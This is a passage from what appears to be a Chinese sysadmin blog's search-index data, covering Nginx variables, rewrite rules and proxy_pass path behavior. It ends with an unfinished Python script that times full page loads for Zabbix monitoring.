这个变量指当前的请求URI，不包括任何参数(见$args) 如:/2013/81.html $request_completion 如果请求结束，设置为OK. 当请求未结束或如果该请求不是请求链串的最后一个时，为空(Empty)，如：OK $server_protocol 请求使用的协议，通常是HTTP/1.0或HTTP/1.1，如：HTTP/1.1 $server_addr 服务器IP地址，在完成一次系统调用后可以确定这个值 $server_name 服务器名称，如：blog.sakmon.com $server_port 请求到达服务器的端口号,如：80 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:7:1","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.5.2. rewrite 语法 rewrite regex replacement [flag]; 应用位置: server、location、if 示例: rewrite ^/(.*) http://www.example.org/$1 permanent; rewrite : 固定关键字 ^/(.*) : 正则表达式(开发正则，程序使用的，如java、php)，用于后面$1的匹配 $1 : 小括号内的内容 permanent ： 301 永久重定向标记 flag 标记说明 : flag标记符号 说明 last 本条规则匹配完成后，继续向下匹配新的location URI规则 break 本条规则被匹配到后，就不在匹配后面的任何规则 redirect 临时重定向 302，浏览器地址会显示跳转后的URL地址 permanent 永久重定向 301,浏览器地址会显示跳转后的URL地址 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:7:2","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.5.3. rewrite 应用场景 可以调整用户浏览的URL，看起来更规范。(别名) 让动态的url地址伪装成静态地址提供服务(伪静态)，可以让搜索引擎收录网站内容让用户体验更好 网站更换域名后，让旧的域名访问跳转到新的域名上。 根据特殊变量、目录、客户端的信息进行URL跳转。 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:7:3","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.5.4. proxy_pass中 带\\ 和 不带\\ 的问题 直接看例子吧, 以下以请求 http://10.0.3.10/api/values 为例 # 1. 最终代理地址 http://10.0.3.10:81/values location /api/ { proxy_pass http://10.0.3.10:81/; } # 2. 最终代理地址 http://10.0.3.10:81/api/values location /api/ { proxy_pass http://10.0.3.10:81; } # 3. 最终代理地址 http://10.0.3.10:81/proxy/values location /api/ { proxy_pass http://10.0.3.10:81/proxy/; } # 4. 最终代理地址 http://10.0.3.10:81/proxyvalues location /api/ { proxy_pass http://10.0.3.10:81/proxy; } ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:7:4","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"全网页加载时间","date":"2019-02-04","objectID":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/","tags":["linux","监控","python"],"title":"Python全网页加载时间","uri":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/"},{"categories":["linux","运维记事"],"content":"本文介绍的是一个关于站点全网页加载时间的一个脚本,前段时间在网络上找了很久关于在线站点全页加载的时间的,一直没有找到合适的,翻越了很久的github终于找到了一个比较适合我现在需求的一个项目,于是拿下来修改了下,目前这个有个问题是不能异步加载 参考项目:[https://github.com/donjajo/loady.git] 修改代码提交地址:[https://github.com/0x5c0f/zbx_page_load.git] 脚本依赖的额外模块: bs4(Beautiful Soup 4.x) 模块安装: pip3 install bs4 ​(或 python3 -m pip install bs4) 检测脚本page-load.py #!/usr/bin/env python3 # #UserParameter=custom.page.load[*],/opt/sh/zbx_discover_site/page-load.py $1 # import requests from bs4 import BeautifulSoup import re import urllib.parse import sys from time import time debug=1 class Loady: files = { 'js' : {}, 'css' : {}, 'img' : {} } def __init__( self, url, headers = {} ): if not isinstance( headers, dict ): raise ValueError( 'Headers argument must be dict instance' ) self.url = url self.total_time = 0 self.js = [] self.css = [] self.img = [] self.http_headers = headers self.soup = None self.total_size = 0 def _get( self, tag ): \"\"\"Gets all site additional files and prepares their URL to be loaded\"\"\" # Get current URL data domain_scheme, domain, _, _, _, _ = urllib.parse.urlparse( self.url ) urls = [] if tag == 'script': # Get all script tag with src attribute # print(self.soup.find_all( 'script', { 'src' : re.compile( r'.*' ) } )) tags = self.soup.find_all( 'script', { 'src' : re.compile( r'.*' ) } ) elif tag == 'img': # print(self.soup.find_all( 'img', { 'src' : re.compile( r'.*' ) } )) tags = self.soup.find_all( 'img', { 'src' : re.compile( r'.*' ) } ) # elif tag is 'i': # print(tags = self.soup.find_all('i', {'style': re.compile(r'.*')})) # tags = self.soup.find_all('i', {'style': re.compile(r'.*')}) else: # Get all link tag with rel=stylesheet # print(self.soup.find_all( 'link', { 'rel' : 'stylesheet' } )) tags = self.soup.find_all( 'link', { 'rel' : 'stylesheet' } ) for each_tag in tags: # Get the value of src or href val = each_tag[ 'src' ] if tag == 'script' or tag == 'img' else each_tag[ 'href' ] #val = '' #if tag is 'script' or tag is 'img': # val = each_tag['src'] #else: # val = each_tag['href'] # parse the URL of the gotten URL url = urllib.parse.urlparse( val ) if not url[ 0 ] and url[ 1 ]: # If URL has no scheme but has domain name, we assume it is a URL that supports HTTP(S). We just append the main site scheme to it if not val.startswith(\"//\"): urls.append( '{0}://{1}'.format( domain_scheme, val ) ) else: urls.append( '{0}:{1}'.format( domain_scheme, val ) ) elif not url[ 1 ]: # URL has no domain, its a relative path. Append the domain name to it if not val.startswith(\"/\"): urls.append( '{0}://{1}/{2}'.format( domain_scheme, domain, val ) ) else: urls.append( '{0}://{1}{2}'.format( domain_scheme, domain, val ) ) else: # Its an absolute path, no issues bro! urls.append( val ) if tag == 'script': self.js = urls elif tag == 'img': self.img = urls else: self.css = urls def _load( self, t ): \"\"\"Load the gotten links, check for response time and size. Appends it to self.files object\"\"\" _link_obj = [] if t == 'script': _link_obj = self.js elif t == 'img': _link_obj = self.img else: _link_obj = self.css # for link in ( self.js if t is 'script' else self.css ): for link in (_link_obj): if debug == 1: print(link) try: start = time() r = requests.get( link ) end = time() # Calculate the total time taken to load link response_time = ( end - start ) # Page loaded successfully if r.status_code == 200: # Get the size of page content size = sys.getsizeof(r.content) if t == 'img' else sys.getsizeof(r.text) # Add results to self.files object obj = '' if t == 'style': obj = 'css' elif t == 'img': obj = 'img' else: obj = 'js' self.files[obj][link] = {'byte_size': size, 'load_time': response_time} # Sum up total time to the existing load time self.total_time += response_time self.total_size += size except Exception as e: if debug == 1: print(e,link) continue def get( self ): \"\"\"Loads the main website, calculate response time, page size and get additional files in site\"\"\" start = time() r = requests.get( self.url, headers = self.http_headers ) stop = time() if r.st","date":"2019-02-04","objectID":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/:0:0","tags":["linux","监控","python"],"title":"Python全网页加载时间","uri":"/posts/python/%E5%85%A8%E7%BD%91%E9%A1%B5%E5%8A%A0%E8%BD%BD%E6%97%B6%E9%97%B4/"}]